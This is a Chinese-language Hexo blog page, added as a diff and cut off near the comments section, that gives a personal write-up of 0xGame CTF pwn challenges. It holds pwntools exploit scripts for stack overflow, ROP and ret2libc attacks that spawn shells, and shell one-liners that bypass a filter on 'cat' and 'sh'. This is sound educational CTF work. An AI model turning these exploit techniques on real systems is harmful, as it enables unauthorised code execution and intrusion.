@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+    <link rel="canonical" href="https://yy-t1.github.io/2026/07/21/pwn/比赛/20250xgame/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="bsahfm">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="T1.test_your_nc直接nc连就有权限 ps：nc一下直接卡住可能是程序在等待数据输入！！！ 不要傻傻以为程序卡住了没连上 T2.stack overflowread读取超过数据本身长度，存在简单栈溢出 backdoor函数里并不是真正的或权限的system shift+F12找到调用&#x2F;bin&#x2F;sh的函数 覆盖返回地址为该地址（直接覆盖返回地址为&#x2F;bin&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20250xgame">
+<meta property="og:url" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/20250xgame/index.html">
+<meta property="og:site_name" content="bsahfm">
+<meta property="og:description" content="T1.test_your_nc直接nc连就有权限 ps：nc一下直接卡住可能是程序在等待数据输入！！！ 不要傻傻以为程序卡住了没连上 T2.stack overflowread读取超过数据本身长度，存在简单栈溢出 backdoor函数里并不是真正的或权限的system shift+F12找到调用&#x2F;bin&#x2F;sh的函数 覆盖返回地址为该地址（直接覆盖返回地址为&#x2F;bin&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-21T14:38:36.000Z">
+<meta property="article:modified_time" content="2026-07-21T15:14:14.856Z">
+<meta property="article:author" content="bsahfm">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+        <meta name="google-site-verification" content="google24f795c42c9493e5.html" />
+  
+  <title>20250xgame - bsahfm</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yy-t1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"A72cL0RlIkmsXlCGMx51Qi51-gzGzoHsz","app_key":"xxsSPn2ge0tYPU7nwv5Gyd1r","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>tyy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="20250xgame"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-21 22:38" pubdate>
+          2026年7月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">20250xgame</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1.test_your_nc"></a>T1.test_your_nc</h1><p>直接nc连就有权限</p>
+<p>ps：nc一下直接卡住可能是程序在等待数据输入！！！</p>
+<p>不要傻傻以为程序卡住了没连上</p>
+<h1 id="T2-stack-overflow"><a href="#T2-stack-overflow" class="headerlink" title="T2.stack overflow"></a>T2.stack overflow</h1><p>read读取超过数据本身长度，存在简单栈溢出</p>
+<p>backdoor函数里并不是真正的或权限的system</p>
+<p>shift+F12找到调用&#x2F;bin&#x2F;sh的函数</p>
+<p>覆盖返回地址为该地址（直接覆盖返回地址为&#x2F;bin&#x2F;sh不可以，每道题需要覆盖至函数开头还是具体指令不一定，根据指令而定）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br>p = process(&#x27;./pwn&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = remote(<span class="hljs-string">&#x27;47.94.87.199&#x27;</span>,38912)</span><br><br>system =0x401218<br><br>p.recvuntil(&#x27;Just say something...&#x27;)<br>payload = b&#x27;a&#x27;*(0x30+8)+ p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="T3-简单数学题"><a href="#T3-简单数学题" class="headerlink" title="T3.简单数学题"></a>T3.简单数学题</h1><p>没有附件</p>
+<p>nc一下发现是解决数学运算，题目给出提示是完成1000道数学题</p>
+<p>接收数据输入结果循环一千次，发现还有数据</p>
+<p>考虑格式化字符串，输入很大数据程序都会崩掉</p>
+<p>多循环一下，循环两千次，成功getshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;nc1.ctfplus.cn&#x27;,38198)<br><br>p.recvuntil(&#x27;Kore wa shiren da!&#x27;)<br><br>for i in range(2000):<br>	print(i)<br>	data = p.recvline()<br>	print(data)<br>	formula = data.decode(&#x27;utf-8&#x27;).strip()<br>	formula = formula.replace(&#x27;=&#x27;, &#x27;&#x27;).replace(&#x27;?&#x27;, &#x27;&#x27;)<br>	print(formula)<br>	if &#x27;+&#x27; in formula:<br>		a, b = formula.split(&#x27;+&#x27;)<br>		result = int(a) + int(b)<br>		p.sendline(str(result))<br>	elif &#x27;-&#x27; in formula:<br>		a, b = formula.split(&#x27;-&#x27;) <br>		result = int(a) - int(b)<br>		p.sendline(str(result))<br>	elif &#x27;x&#x27; in formula:<br>		a, b = formula.split(&#x27;x&#x27;)<br>		result = int(a) * int(b)<br>		p.sendline(str(result))<br>	else:<br>		print(formula)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><strong>实际是自己把good work也算进去了一次循环</strong></p>
+<p>每次输入对了还有good work输出，<strong>所以自己好好看清楚程序输入输出</strong></p>
+<p><strong>因此这里要循环两千次</strong></p>
+<h1 id="T4-命令执行"><a href="#T4-命令执行" class="headerlink" title="T4.命令执行"></a>T4.命令执行</h1><p>过滤cat与sh获得flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">a=c;b=at;$a$b flag<br>c&#x27;a&#x27;t flag<br>c&quot;a&quot;t flag<br>/???/c?t flag<br></code></pre></td></tr></table></figure>
+
+<h1 id="T5-ROP1"><a href="#T5-ROP1" class="headerlink" title="T5.ROP1"></a>T5.ROP1</h1><p>一定要按照题目思路来，题目说参数分离就是参数分离不要想复杂</p>
+<p>这道题按道理来讲还可以puts打印system@got泄露lib基址找里面的&#x2F;bin&#x2F;sh构造</p>
+<p>栈溢出为read读取过多字节</p>
+<p>这道题就是用rdi为system函数传参</p>
+<ol>
+<li>找到rdi_ret–<code>ROPgadget --binary ./pwn --only &quot;pop|ret&quot; | grep rdi</code></li>
+<li>找到sh参数（这里我一开始想找&#x2F;bin&#x2F;sh找不到）–<code>ROPgadget --binary ./pwn --string &quot;sh&quot;</code></li>
+<li>栈溢出构造payload</li>
+</ol>
+<p>覆盖函数为elf.got与elf.plt都失败，只有直接找system的地址（call -system的指令）才能成功</p>
+<p>这是因为栈对齐。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">sh = 0x40201e<br><br>from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;nc1.ctfplus.cn&#x27;,22923)<br>p.recvuntil(&#x27;Maybe you need this: sh&#x27;)<br>elf = ELF(&#x27;./pwn&#x27;)<br><br>rdi_ret = 0x40117e<br><span class="hljs-meta prompt_">#</span><span class="language-bash">system = elf.got[<span class="hljs-string">&#x27;system&#x27;</span>]</span><br>system = 0x401195<br><br>payload = b&#x27;a&#x27;*(0x20+8) + p64(rdi_ret) + p64(sh) + p64(system)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="T6-ROP2"><a href="#T6-ROP2" class="headerlink" title="T6.ROP2"></a>T6.ROP2</h1><p>这题做的挺久的</p>
+<p>首先是不知道system（’&#x2F;bin&#x2F;sh’）system（’sh’）system（’$0’)都能getshell</p>
+<p>其次1929392164转化为16进制在小端序里是$0</p>
+<p>最后找这个字节直接：gdb里<code>search $0</code>就行了。哭死</p>
+<p>payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><br>elf = ELF(&#x27;./pwn&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">gadget地址（需要查找）</span><br>pop_rdi = 0x40119E  # 需要实际查找pop rdi; ret<br>system = 0x40122B<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">幸运数字在代码段的地址</span><br>luck_num_addr = 0x401202  <br><br>offset = 56<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;nc1.ctfplus.cn&#x27;,40632)<br>payload = b&#x27;A&#x27; * offset + p64(pop_rdi) + p64(luck_num_addr) + p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="T7-ret2libc"><a href="#T7-ret2libc" class="headerlink" title="T7.ret2libc"></a>T7.ret2libc</h1><p>程序很简单就是一个栈溢出</p>
+<p>checksec一下只开了NX</p>
+<p>根据题目提示这是ret2libc的题目</p>
+<p>所以思路是puts打印地址，回到main函数，再system一下</p>
+<p>错误：</p>
+<p>1.用call puts的指令导致其会在call之后执行其他指令，需要用elf.plt</p>
+<p>2.main函数最好也用elf.main（害怕IDA会错误）</p>
+<p>3.第二个payload一开始没有覆盖返回地址直接构造ROP链了导致错误（真的愚蠢），而且还想了很久为什么getshell</p>
+<p>4.最后记得布置好gdb查看正确还不行的话就是没有栈对齐，找一个ret即可</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;nc1.ctfplus.cn&#x27;,32301)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br><br><br>puts_got = elf.got[&#x27;puts&#x27;]<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>rdi_ret = 0x40119e<br>main = elf.symbols[&#x27;main&#x27;]<br>ret = 0x40110f<br><br><br>p.recvuntil(&quot;Input something: &quot;)<br><br><br>payload1 = b&#x27;a&#x27;*72 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload1)<br>p.recvline()<br>puts_libc = u64(p.recvline()[:-1].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts_libc))<br><br>libc_base = puts_libc - libc.symbols[&#x27;puts&#x27;]<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.recvuntil(&quot;Input something: &quot;)<br><br>payload2 =  b&#x27;a&#x27;*72 + p64(rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="T8-高等数学"><a href="#T8-高等数学" class="headerlink" title="T8.高等数学"></a>T8.高等数学</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell">_BOOL8 __fastcall cala(__int64 n119)<br>&#123;<br>  unsigned int seed_2; // eax<br>  unsigned int seed_1; // eax<br>  unsigned int seed; // eax<br>  int ___x%_&amp;__x%_&amp;__1; // [rsp+1Ch] [rbp-24h] BYREF<br>  int v6; // [rsp+20h] [rbp-20h]<br>  int ___x%_&amp;__x%_&amp;_; // [rsp+24h] [rbp-1Ch]<br>  int v8; // [rsp+28h] [rbp-18h]<br>  int ___x%_&amp;__x%_&amp;__2; // [rsp+2Ch] [rbp-14h]<br>  int v10; // [rsp+30h] [rbp-10h]<br>  int ___x%_&amp;__x%_&amp;__3; // [rsp+34h] [rbp-Ch]<br>  unsigned __int64 v12; // [rsp+38h] [rbp-8h]<br><br>  v12 = __readfsqword(0x28u);<br>  if ( (int)n119 &gt; 39 )<br>  &#123;<br>    if ( (int)n119 &gt; 79 )<br>    &#123;<br>      v6 = rand() % 6;<br>      if ( !flag3 )<br>      &#123;<br>        flag3 = 1;<br>        seed = rand();<br>        srand(seed);<br>        offset = rand() % 6;<br>      &#125;<br>      printf(&quot;%d %c %d = \n&quot;, Num1[(int)n119], (unsigned int)sym[offset + v6], Num2[(int)n119]);// &quot;+-x%^&amp;+-x%^&amp;&quot;<br>      __isoc99_scanf(&quot;%d&quot;, &amp;___x%_&amp;__x%_&amp;__1);<br>      ___x%_&amp;__x%_&amp;_ = Trueval((unsigned int)Num1[(int)n119], (unsigned int)sym[v6], (unsigned int)Num2[(int)n119]);// &quot;+-x%^&amp;+-x%^&amp;&quot;<br>      return ___x%_&amp;__x%_&amp;_ != ___x%_&amp;__x%_&amp;__1;<br>    &#125;<br>    else<br>    &#123;<br>      v8 = rand() % 6;<br>      if ( !flag2 )<br>      &#123;<br>        flag2 = 1;<br>        seed_1 = rand();<br>        srand(seed_1);<br>        offset = rand() % 6;<br>      &#125;<br>      printf(&quot;%d %c %d = \n&quot;, Num1[(int)n119], (unsigned int)sym[offset + v8], Num2[(int)n119]);// &quot;+-x%^&amp;+-x%^&amp;&quot;<br>      __isoc99_scanf(&quot;%d&quot;, &amp;___x%_&amp;__x%_&amp;__1);<br>      ___x%_&amp;__x%_&amp;__2 = Trueval((unsigned int)Num1[(int)n119], (unsigned int)sym[v8], (unsigned int)Num2[(int)n119]);// &quot;+-x%^&amp;+-x%^&amp;&quot;<br>      return ___x%_&amp;__x%_&amp;__2 != ___x%_&amp;__x%_&amp;__1;<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    v10 = rand() % 6;<br>    if ( !flag1 )<br>    &#123;<br>      flag1 = 1;<br>      seed_2 = rand();<br>      srand(seed_2);<br>      offset = rand() % 6;<br>    &#125;<br>    printf(&quot;%d %c %d = \n&quot;, Num1[(int)n119], (unsigned int)sym[offset + v10], Num2[(int)n119]);// &quot;+-x%^&amp;+-x%^&amp;&quot;<br>    __isoc99_scanf(&quot;%d&quot;, &amp;___x%_&amp;__x%_&amp;__1);<br>    ___x%_&amp;__x%_&amp;__3 = Trueval((unsigned int)Num1[(int)n119], (unsigned int)sym[v10], (unsigned int)Num2[(int)n119]);// &quot;+-x%^&amp;+-x%^&amp;&quot;<br>    return ___x%_&amp;__x%_&amp;__3 != ___x%_&amp;__x%_&amp;__1;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>比较的时候符号会有offset</p>
+<p>但是offset有限，所以可以进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>p = process(&#x27;./pwn&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = remote(<span class="hljs-string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,27319)</span><br>p.recvuntil(b&quot;Can you finish this test?\n&quot;)<br>while True:<br>	val = p.recvuntil(b&quot;=&quot;)[:-2]<br>	if b&#x27;x&#x27; in val:<br>		val = val.replace(b&#x27;x&#x27;,b&#x27;*&#x27;,)<br>	val = eval(val)<br>	p.sendline(str(val).encode())<br>	tmp = p.recvline()<br>	t = p.recvline()<br>	print(t)<br>	if b&quot;lose&quot; in t:<br>		p.close()<br>		p = process(&#x27;./pwn&#x27;)<br>		p.recvuntil(b&quot;Can you finish this test?\n&quot;)<br>	elif b&quot;got&quot; in t:<br>		p.interactive()<br>	else:<br>		p.recvline()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>20250xgame</div>
+      <div>https://yy-t1.github.io/2026/07/21/pwn/比赛/20250xgame/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bsahfm</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025isctf/" title="2025isctf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025isctf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/" title="2025moectf">
+                        <span class="hidden-mobile">2025moectf</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
